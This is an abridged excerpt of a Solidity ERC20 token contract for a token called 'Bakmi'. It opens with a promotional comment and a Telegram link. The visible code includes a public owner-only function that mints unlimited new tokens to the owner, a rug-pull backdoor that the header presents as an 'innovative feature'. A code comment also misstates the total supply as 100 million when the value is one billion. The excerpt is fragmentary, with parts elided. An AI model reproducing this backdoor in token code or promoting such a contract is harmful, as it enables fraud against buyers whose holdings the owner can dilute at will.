...
//
// $Bakmi proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/BakmiBSC
//  
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Bakmi(uint256 amount) public onlyOwner {
 _Bakmi(msg.sender, amount);
    }
    ...
    function _Bakmi(address account, uint256 amount) internal virtual {
...
contract $Bakmi is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Bakmi", "BAKMI") {
     _Bakmi(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}